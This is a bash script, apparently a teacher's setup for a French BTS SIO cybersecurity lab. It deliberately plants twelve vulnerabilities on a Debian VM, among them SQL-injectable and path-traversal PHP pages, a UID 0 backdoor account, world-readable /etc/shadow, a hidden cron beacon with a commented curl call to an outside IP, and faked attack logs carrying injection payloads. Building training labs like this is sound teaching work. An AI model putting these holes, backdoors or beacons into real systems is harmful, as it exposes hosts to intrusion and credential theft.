#!/bin/bash
# ═══════════════════════════════════════════════════════════════════
#  SCRIPT MAÎTRE — TP1 : VM srv-mecaforge (Debian 12 vulnérable)
#  BTS SIO SISR — Module Cybersécurité
#  Réservé à l'enseignant — Ne pas distribuer
# ═══════════════════════════════════════════════════════════════════
# Usage : sudo bash tp1_setup_vm.sh
# Temps : ~15 min après installation de base Debian 12
# ═══════════════════════════════════════════════════════════════════

set -e
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
log()  { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
info() { echo -e "${CYAN}[*]${NC} $1"; }
err()  { echo -e "${RED}[✗]${NC} $1"; }

echo ""
echo "╔══════════════════════════════════════════════════════╗"
echo "║   BTS SIO SISR — TP1 : Setup VM srv-mecaforge        ║"
echo "║   Script enseignant — Injection de 12 vulnérabilités ║"
echo "╚══════════════════════════════════════════════════════╝"
echo ""

# Vérification root
if [ "$EUID" -ne 0 ]; then
  err "Ce script doit être exécuté en tant que root"
  exit 1
fi

# ─────────────────────────────────────────────────────────────────
# PHASE 0 — Configuration hostname
# ─────────────────────────────────────────────────────────────────
info "Phase 0/5 — Changement du hostname..."
hostnamectl set-hostname srv-mecaforge
# ─────────────────────────────────────────────────────────────────
# PHASE 1 — Installation des paquets
# ─────────────────────────────────────────────────────────────────
info "Phase 1/5 — Installation des paquets..."

apt update -qq && apt upgrade -y -qq

DEBIAN_FRONTEND=noninteractive apt install -y -qq \
  apache2 openssh-server nmap net-tools curl wget git \
  vsftpd telnetd nfs-kernel-server \
  php libapache2-mod-php php-mysql mariadb-server \
  fail2ban ufw lynis htop tree vim cron \
  inetutils-inetd 2>/dev/null || true

log "Paquets installés"

# ─────────────────────────────────────────────────────────────────
# PHASE 2 — Création des utilisateurs
# ─────────────────────────────────────────────────────────────────
info "Phase 2/5 — Création des utilisateurs..."

# Utilisateur principal (connu des étudiants)
id adminsisr &>/dev/null || useradd -m -s /bin/bash adminsisr
echo "adminsisr:Admin2024!" | chpasswd
usermod -aG sudo adminsisr
log "adminsisr créé (Admin2024!)"

# Utilisateur de service avec MDP faible (dans rockyou.txt)
id backupuser &>/dev/null || useradd -m -s /bin/bash backupuser
echo "backupuser:backup123" | chpasswd
log "backupuser créé (backup123)"

# Ancien compte non désactivé
id oldadmin &>/dev/null || useradd -m -s /bin/bash oldadmin
echo "oldadmin:oldpass" | chpasswd
chage -M 99999 oldadmin  # Pas d'expiration
log "oldadmin créé (oldpass)"

# ─────────────────────────────────────────────────────────────────
# PHASE 3 — Configuration des services légitimes
# ─────────────────────────────────────────────────────────────────
info "Phase 3/5 — Configuration des services..."

# Apache
mkdir -p /var/www/html /var/www/intranet /var/www/files
echo "<h1>Bienvenue sur l'intranet MECAFORGE</h1><p>ERP Version 3.2</p>" > /var/www/html/index.html
echo "Bienvenue sur l'intranet MECAFORGE" > /var/www/files/home.txt

# Page SQLi volontairement vulnérable
cat > /var/www/html/search.php << 'PHPEOF'
<?php
// Page recherche ERP MECAFORGE — INTENTIONNELLEMENT VULNÉRABLE (usage pédagogique)
$conn = new mysqli("localhost", "erp_user", "erp2024", "erp_mecaforge");
$q = $_GET["q"] ?? "";
echo "<html><head><title>Recherche ERP</title></head><body>";
echo "<h2>Résultats pour : " . $q . "</h2>";
if ($q !== "") {
    $result = $conn->query("SELECT * FROM produits WHERE nom LIKE '%$q%'");
    if ($result) {
        while ($row = $result->fetch_assoc()) {
            echo "<p>" . $row["nom"] . " — Réf: " . $row["ref"] . "</p>";
        }
    } else {
        echo "<p>Erreur requête : " . $conn->error . "</p>";
    }
}
echo "</body></html>";
?>
PHPEOF

# Page LFI volontairement vulnérable
cat > /var/www/html/view.php << 'PHPEOF'
<?php
// Visionneuse de fichiers ERP — INTENTIONNELLEMENT VULNÉRABLE
$file = $_GET["file"] ?? "home.txt";
$path = "/var/www/files/" . $file;  // Pas de protection path traversal
echo "<pre>" . file_get_contents($path) . "</pre>";
?>
PHPEOF

# MariaDB
systemctl start mariadb
mysql -e "CREATE DATABASE IF NOT EXISTS erp_mecaforge;"
mysql -e "CREATE USER IF NOT EXISTS 'erp_user'@'localhost' IDENTIFIED BY 'erp2024';"
mysql -e "GRANT ALL ON erp_mecaforge.* TO 'erp_user'@'localhost';"
mysql -e "FLUSH PRIVILEGES;"
mysql erp_mecaforge -e "
CREATE TABLE IF NOT EXISTS produits (
  id INT AUTO_INCREMENT PRIMARY KEY,
  nom VARCHAR(200),
  ref VARCHAR(50),
  prix DECIMAL(10,2)
);
INSERT IGNORE INTO produits (nom,ref,prix) VALUES
  ('Pièce CNC ref A-4521','A-4521',45.50),
  ('Pièce forgée B-1203','B-1203',123.00),
  ('Assemblage C-9987','C-9987',280.75);
"
log "MariaDB et table produits configurés"

# Fichier de configuration avec credentials en clair (faille 5)
mkdir -p /opt/erp/config
chmod 777 /opt/erp/config
cat > /opt/erp/config/database.conf << EOF
# Configuration ERP MECAFORGE
DB_HOST=localhost
DB_USER=erp_user
DB_PASS=erp2024
DB_NAME=erp_mecaforge
ADMIN_PASS=Admin2024!
API_KEY=sk-mecaforge-prod-a1b2c3d4e5f6
EOF
chmod 644 /opt/erp/config/database.conf
log "Fichier de config avec credentials créé"

# Apache server-status public (faille 9)
cat > /etc/apache2/conf-available/vuln-status.conf << 'EOF'
<Location "/server-status">
    SetHandler server-status
    Require all granted
</Location>
<Location "/server-info">
    SetHandler server-info
    Require all granted
</Location>
EOF
a2enconf vuln-status 2>/dev/null || true
a2enmod status info 2>/dev/null || true
systemctl enable apache2
systemctl restart apache2
log "Apache configuré (server-status public)"

# ─────────────────────────────────────────────────────────────────
# PHASE 4 — Injection des vulnérabilités
# ─────────────────────────────────────────────────────────────────
info "Phase 4/5 — Injection des 12 vulnérabilités..."

## FAILLE 1 : SSH — PermitRootLogin yes
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.orig
sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
grep -q "PermitRootLogin yes" /etc/ssh/sshd_config || echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "root:toor" | chpasswd
log "[VULN 1/12] SSH : PermitRootLogin yes + root:toor"

## FAILLE 2 : SSH — MaxAuthTries 10, pas de timeout
sed -i '/^MaxAuthTries/d' /etc/ssh/sshd_config
sed -i '/^ClientAlive/d' /etc/ssh/sshd_config
echo "MaxAuthTries 10" >> /etc/ssh/sshd_config
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
systemctl restart sshd
log "[VULN 2/12] SSH : MaxAuthTries 10, pas de ClientAliveInterval"

## FAILLE 3 : Telnet actif
systemctl enable telnet.socket 2>/dev/null || true
systemctl start telnet.socket 2>/dev/null || true
# Alternative avec inetd
if command -v inetd &>/dev/null; then
  echo "telnet stream tcp nowait root /usr/sbin/telnetd telnetd" >> /etc/inetd.conf
  systemctl restart inetutils-inetd 2>/dev/null || true
fi
log "[VULN 3/12] Telnet activé (port 23)"

## FAILLE 4 : FTP anonyme avec fichiers sensibles
cat > /etc/vsftpd.conf << 'EOF'
listen=YES
listen_ipv6=NO
anonymous_enable=YES
local_enable=YES
write_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
dirmessage_enable=YES
use_localtime=YES
xferlog_enable=YES
connect_from_port_20=YES
vsftpd_log_file=/var/log/vsftpd.log
EOF
mkdir -p /srv/vsftpd/pub
# Fichiers "sensibles" dans le FTP anonyme
echo "Sauvegarde ERP MECAFORGE - 2024 - CONFIDENTIEL" > /srv/vsftpd/pub/backup_erp_2024.txt
echo -e "adminsisr:Admin2024!\nbackupuser:backup123\nroot:toor" > /srv/vsftpd/pub/credentials_backup.txt
chown -R ftp:ftp /srv/vsftpd/pub 2>/dev/null || chown -R nobody:nogroup /srv/vsftpd/pub
sed -i 's|^anon_root=.*||' /etc/vsftpd.conf
echo "anon_root=/srv/vsftpd" >> /etc/vsftpd.conf
systemctl enable vsftpd
systemctl restart vsftpd
log "[VULN 4/12] FTP anonyme avec fichiers sensibles"

## FAILLE 5 : Permissions incorrectes
chmod 644 /etc/shadow
chmod 666 /etc/passwd
chmod 777 /tmp
log "[VULN 5/12] /etc/shadow en 644, /etc/passwd en 666"

## FAILLE 6 : Compte backdoor UID 0
useradd -o -u 0 -g 0 -m -s /bin/bash sysbackup 2>/dev/null || true
echo "sysbackup:SysB@ck2024" | chpasswd
log "[VULN 6/12] Compte sysbackup avec UID 0"

## FAILLE 7 : Cron job malveillant
mkdir -p /opt/.hidden
cat > /opt/.hidden/beacon.sh << 'EOF'
#!/bin/bash
# Beacon simulation (inoffensif — pédagogique)
logger -t "svc_beacon" "Heartbeat sent to 185.220.101.45"
# curl -s http://185.220.101.45/beacon?host=$(hostname) > /dev/null 2>&1
EOF
chmod +x /opt/.hidden/beacon.sh
(crontab -l 2>/dev/null; echo "*/5 * * * * /opt/.hidden/beacon.sh") | crontab -
log "[VULN 7/12] Crontab malveillant (beacon toutes les 5 min)"

## FAILLE 8 : NFS exports permissifs
mkdir -p /srv/nfs/data_erp
cp /opt/erp/config/database.conf /srv/nfs/data_erp/
echo "/srv/nfs/data_erp *(rw,no_root_squash,no_subtree_check)" >> /etc/exports
systemctl enable nfs-kernel-server
systemctl restart nfs-kernel-server
exportfs -ra
log "[VULN 8/12] NFS *(rw,no_root_squash)"

## FAILLE 9 : Déjà fait (server-status Apache)
log "[VULN 9/12] Apache server-status public (déjà configuré)"

## FAILLE 10 : Firewall désactivé
ufw disable 2>/dev/null || true
iptables -F 2>/dev/null || true
log "[VULN 10/12] UFW désactivé, iptables vidé"

## FAILLE 11 : Pas de politique de mots de passe
# Désactiver PAM pwquality si présent
sed -i 's/^password.*pam_pwquality.*/# &/' /etc/pam.d/common-password 2>/dev/null || true
# Expiration très longue
chage -M 99999 -m 0 backupuser
chage -M 99999 -m 0 oldadmin
log "[VULN 11/12] Politique MDP absente, comptes sans expiration"

## FAILLE 12 : Binaires SUID non nécessaires
chmod u+s /usr/bin/nmap 2>/dev/null || true
chmod u+s /usr/bin/vim.basic 2>/dev/null || true
chmod u+s /usr/bin/find 2>/dev/null || true
log "[VULN 12/12] SUID sur nmap, vim, find"

# ─────────────────────────────────────────────────────────────────
# PHASE 5 — Génération des logs réalistes
# ─────────────────────────────────────────────────────────────────
info "Phase 5/5 — Génération des logs réalistes..."

# Tentatives SSH bruteforce dans auth.log
PAST=$(date -d "-72hours" "+%b %e")
PAST2=$(date -d "-48hours" "+%b %e")
for i in $(seq 1 50); do
  echo "$PAST2 02:$(printf "%02d" $((i/60)))":$(printf "%02d" $((i%60)))" srv-mecaforge sshd[$((1200+i))]: Failed password for invalid user admin from 185.220.101.$(( RANDOM % 254 + 1 )) port $((40000+i)) ssh2" >> /var/log/auth.log
done

# Logs Apache suspects
ACCESS_LOG="/var/log/apache2/access.log"
TODAY=$(date "+%d/%b/%Y")
# SQLi
for i in $(seq 1 20); do
  echo "185.220.101.47 - - [$TODAY:03:$(printf "%02d:%02d" $((RANDOM%59)) $((RANDOM%59))) +0000] \"GET /search.php?q=' UNION SELECT 1,database(),3-- HTTP/1.1\" 200 512 \"-\" \"sqlmap/1.7.9\"" >> "$ACCESS_LOG"
done
# Path traversal
for path in "../../etc/passwd" "../../../etc/shadow" "../../var/www/html/wp-config.php"; do
  echo "91.108.4.201 - - [$TODAY:04:22:11 +0000] \"GET /view.php?file=$path HTTP/1.1\" 200 1423 \"-\" \"curl/7.88\"" >> "$ACCESS_LOG"
done
# Nikto scan
for p in "/.env" "/.git/config" "/wp-config.php.bak" "/admin/" "/phpmyadmin/" "/.htpasswd"; do
  echo "45.142.212.100 - - [$TODAY:02:15:$(printf "%02d" $((RANDOM%59))) +0000] \"GET $p HTTP/1.1\" 404 196 \"-\" \"Nikto/2.1.6\"" >> "$ACCESS_LOG"
done

# Log FTP anonyme
echo "$(date "+%a %b %e %H:%M:%S %Y") [pid $$] [anonymous] OK LOGIN: Client \"185.220.0.99\"" >> /var/log/vsftpd.log
echo "$(date "+%a %b %e %H:%M:%S %Y") [pid $$] [anonymous] OK DOWNLOAD: Client \"185.220.0.99\", \"/pub/credentials_backup.txt\", 56 bytes" >> /var/log/vsftpd.log

log "Logs réalistes générés"

# ─────────────────────────────────────────────────────────────────
# RÉSUMÉ FINAL
# ─────────────────────────────────────────────────────────────────
echo ""
echo "╔══════════════════════════════════════════════════════╗"
echo "║              SETUP TERMINÉ — srv-mecaforge            ║"
echo "╠══════════════════════════════════════════════════════╣"
echo "║  12 vulnérabilités injectées avec succès              ║"
echo "║                                                        ║"
echo "║  À FAIRE MAINTENANT :                                  ║"
echo "║  1. ip addr show  →  noter l'IP de la VM              ║"
echo "║  2. Snapshot : 'etat_initial_tp1_vuln'                ║"
echo "║  3. Distribuer : IP + adminsisr/Admin2024!            ║"
echo "╚══════════════════════════════════════════════════════╝"
echo ""
echo "IP de cette VM :"
ip addr show | grep "inet " | grep -v 127 | awk '{print "  →  " $2}'
echo ""
warn "NE PAS DISTRIBUER CE SCRIPT AUX ÉTUDIANTS"
